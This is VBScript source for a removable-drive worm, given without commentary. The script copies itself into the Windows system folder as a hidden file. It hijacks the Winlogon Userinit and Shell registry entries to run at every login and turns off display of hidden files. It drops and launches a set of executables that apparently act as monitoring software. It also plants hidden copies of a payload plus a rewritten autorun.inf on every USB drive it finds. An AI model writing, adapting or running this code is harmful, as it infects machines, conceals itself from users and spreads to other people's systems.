Option Explicit
On Error Resume Next

Dim fso, Shells, WinDir, SystemDir, WriteAll, File, Drv, InDrive, ReadAll, AllFile, root, Count,Drives,Del,Chg,folder, files, just, Test, appfolder, kinzadir

Set fso = CreateObject("Scripting.FileSystemObject")
Set Shells = CreateObject("Wscript.Shell")
Set WinDir = fso.GetSpecialFolder(0)
Set SystemDir = fso.GetSpecialFolder(1)
Set File = fso.GetFile(WScript.ScriptFullName)
Set Drv = File.Drive
Set InDrive = fso.drives
appfolder=Shells.SpecialFolders("AppData")
kinzadir = appfolder & "\dxdlls"

Set ReadAll = File.OpenAsTextStream(1,-2)
do while not ReadAll.atendofstream
AllFile = AllFile & ReadAll.readline
AllFile = AllFile & vbcrlf
Loop

For Each Test In InDrive
	If fso.FileExists(Test.Path & "\isetup.exe") Then
		Shells.Run "explorer.exe " & Test.Path & "\"
	End If
Next

Count=Drv.DriveType

Do

If Not fso.FileExists(SystemDir & "\boot.vbs") Then
		set WriteAll = fso.CreateTextFile(SystemDir & "\boot.vbs",2,true)
		WriteAll.Write AllFile 
		WriteAll.close
		set WriteAll = fso.GetFile(SystemDir & "\boot.vbs")
		WriteAll.Attributes = -1
End If




If fso.FileExists(SystemDir & "\boot.vbs") Then
		Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",SystemDir & "\userinit.exe," & _
	SystemDir & "\wscript.exe " & SystemDir & "\boot.vbs"
End If
If fso.FileExists(SystemDir & "\wproxp.exe") and fso.FileExists(SystemDir & "\dxdlg.exe") Then
		Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe wproxp.exe"
End If
Shells.RegWrite  "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue","0","REG_DWORD"



For Each Drives In InDrive 

	If Not fso.FileExists(SystemDir & "\isetup.exe") Then
		If Drives.DriveType = 1 Then
			If Drives.Path<> "A:" Then
				If fso.FileExists(Drives.Path & "\isetup.exe") Then
					CopyTheFile Drives.Path & "\isetup.exe", SystemDir & "\isetup.exe"
					MakeFileHidden SystemDir & "\isetup.exe"
				End If
			End If
		End If		
	End If

		If Not fso.FileExists(SystemDir & "\drivers\etc\hints.exe") Then
			If fso.FileExists(SystemDir & "\isetup.exe") Then
				CopyTheFile SystemDir & "\isetup.exe", SystemDir & "\drivers\etc\hints.exe"
				MakeFileHidden SystemDir & "\drivers\etc\hints.exe"
			End If
		End If
		If Not fso.FileExists(SystemDir & "\isetup.exe") Then
			If fso.FileExists(SystemDir & "\drivers\etc\hints.exe") Then
				CopyTheFile SystemDir & "\drivers\etc\hints.exe", SystemDir & "\isetup.exe"
				MakeFileHidden SystemDir & "\isetup.exe"
			End If
		End If
		If Not fso.FileExists(SystemDir & "\isetup.exe") Then
			If fso.FileExists(kinzadir & "\isetup.exe") Then
				CopyTheFile kinzadir & "\isetup.exe", SystemDir & "\isetup.exe"
				MakeFileHidden SystemDir & "\isetup.exe"
			End If
		End If
		If Not fso.FileExists(kinzadir & "\isetup.exe") Then
			If fso.FileExists(SystemDir & "\drivers\etc\hints.exe") Then
				CopyTheFile SystemDir & "\drivers\etc\hints.exe", kinzadir & "\isetup.exe"
				MakeFileHidden kinzadir & "\isetup.exe"
			End If
		End If

If Not fso.FileExists(SystemDir & "\ActMon.ini") Then
	CopyTheFile kinzadir & "\ActMon.ini", SystemDir & "\ActMon.ini"
End If
If Not fso.FileExists(SystemDir & "\imapd.exe") Then
	CopyTheFile kinzadir & "\imapd.exe", SystemDir & "\imapd.exe"
End If
If Not fso.FileExists(SystemDir & "\imapdb.dll") Then
	CopyTheFile kinzadir & "\imapdb.dll", SystemDir & "\imapdb.dll"
End If
If Not fso.FileExists(SystemDir & "\imapdb.exe") Then
	CopyTheFile kinzadir & "\imapdb.exe", SystemDir & "\imapdb.exe"
End If
If Not fso.FileExists(SystemDir & "\imapdc.dll") Then
	CopyTheFile kinzadir & "\imapdc.dll", SystemDir & "\imapdc.dll"
End If

If Not fso.FileExists(SystemDir & "\imapdd.dll") Then
	CopyTheFile kinzadir & "\imapdd.dll", SystemDir & "\imapdd.dll"
End If
If Not fso.FileExists(SystemDir & "\imapde.dll") Then
	CopyTheFile kinzadir & "\imapde.dll", SystemDir & "\imapde.dll"
End If
If Not fso.FileExists(SystemDir & "\dxdlg.exe") Then
	CopyTheFile kinzadir & "\dxdlg.exe", SystemDir & "\dxdlg.exe"
End If
If Not fso.FileExists(SystemDir & "\wproxp.exe") Then
	CopyTheFile kinzadir & "\wproxp.exe", SystemDir & "\wproxp.exe"
End If

If fso.FileExists(kinzadir & "\ActMon.ini") And fso.FileExists(SystemDir & "\ActMon.ini") Then
		Shells.Run SystemDir & "\imapd.exe"
		DeleteTheFile kinzadir & "\ActMon.ini"
End If

If fso.FileExists(kinzadir & "\wproxp.exe") And fso.FileExists(SystemDir & "\wproxp.exe") Then
		Shells.Run SystemDir & "\wproxp.exe"
		DeleteTheFile kinzadir & "\wproxp.exe"
End If

		If Drives.DriveType = 1 Then
			delext "inf",Drives.Path & "\"
			delext "INF",Drives.Path & "\"
		End if 

				If Drives.DriveType = 1 Then
					If Drives.Path<>"A:" Then
						If Not fso.FileExists(Drives.Path & "\isetup.exe") Then
							CopyTheFile SystemDir & "\isetup.exe", Drives.Path & "\isetup.exe"
							MakeFileHidden Drives.Path & "\isetup.exe"
						End If
						If fso.FileExists(Drives.Path & "\isetup.exe") Then
							MakeFileHidden Drives.Path & "\isetup.exe"
						End If
						If Not fso.FileExists(Drives.Path & "\explorer.exe") Then
							CopyTheFile WinDir & "\explorer.exe", Drives.Path & "\explorer.exe"
							MakeFileHidden Drives.Path & "\explorer.exe"
						End If
						
						
						
				
						If fso.FileExists(Drives.Path & "\autorun.inf") Or fso.FileExists(Drives.Path & "\AUTORUN.INF") Then 
							Set Chg = fso.GetFile(Drives.Path & "\autorun.inf")
							Chg.Attributes = -8
							Set WriteAll = fso.CreateTextFile(Drives.Path & "\autorun.inf",2,True)
							WriteAll.writeline "[autorun]"
							WriteAll.WriteLine "open=isetup.exe"
							WriteAll.WriteLine "shell\open=Open"
							WriteAll.WriteLine "Action=Explore the Drive"
							WriteAll.WriteLine "Icon=explorer.exe"							
							WriteAll.WriteLine "shell\open\Command=isetup.exe"
							WriteAll.WriteLine "shell\explore=Explore"
							WriteAll.WriteLine "shell\explore\Command=isetup.exe"
							WriteAll.Close
							MakeFileHidden Drives.Path & "\autorun.inf"
						else
							Set WriteAll = fso.CreateTextFile(Drives.Path & "\autorun.inf",2,True)
							WriteAll.writeline "[autorun]"
							WriteAll.WriteLine "open=isetup.exe"
							WriteAll.WriteLine "shell\open=Open"
							WriteAll.WriteLine "Action=Explore the Drive"
							WriteAll.WriteLine "Icon=explorer.exe"
							WriteAll.WriteLine "shell\open\Command=isetup.exe"
							WriteAll.WriteLine "shell\explore=Explore"
							WriteAll.WriteLine "shell\explore\Command=isetup.exe"
							WriteAll.Close
							MakeFileHidden Drives.Path & "\autorun.inf"
						End if
					End If
				End If
				
			
	Next






	if Count <> 1 then
	Wscript.sleep 10000
	end if

loop while Count<>1




Sub CreateNewFolder(FolderName)
	Dim fldr
   Set fldr = fso.CreateFolder(FolderName)
End Sub


Sub DeleteNewFolder(FolderName)
	Dim fldr
	Set fldr = fso.DeleteFolder(FolderName)
End Sub

Sub CreateNewFile(FileName)
	Dim f0
	Set f0=fso.CreateTextFile(FileName)
End Sub


Sub MoveTheFile(Source,Dest)
	Dim f1
	Set f1 = fso.GetFile(Source)
	f1.Move(Dest)
End Sub


Sub CopyTheFile(Source,Dest)
	Dim f2
	Set f2=fso.GetFile(Source)
	f2.Copy(dest)
End Sub


Sub DeleteTheFile(Source)
	Dim f3
	Set f3=fso.GetFile(Source)
	f3.Delete
End Sub


Sub CopyTheFolder(Source, Dest)
	Dim f4
	Set f4=fso.GetFolder(Source)
	f4.Copy(Dest)
End Sub


Sub MoveTheFolder(Source,Dest)
	Dim f5
	Set f5=fso.GetFolder(Source)
	f5.Move(Dest)
End Sub


Sub RunTheProgram(ProgramName)
	Shells.Run(ProgramName)
End Sub


Sub MakeFileHidden(FileName)
	Dim f6
	Set f6=fso.GetFile(FileName)
	f6.Attributes=-1
End Sub

sub Delext(File2Find, SrchPath)
   Dim oFileSys, oFolder, oFile,Cut,Delete
   Set oFileSys = CreateObject("Scripting.FileSystemObject")
   Set oFolder = oFileSys.GetFolder(SrchPath)
   For Each oFile In oFolder.Files
		Cut=Right(oFile.Name,3)
		If UCase(Cut)=UCase(file2find) Then
			If oFile.Name <> "boot.vbs" Then Set Delete = oFileSys.DeleteFile(srchpath & oFile.Name,true)
		End If
   Next
End sub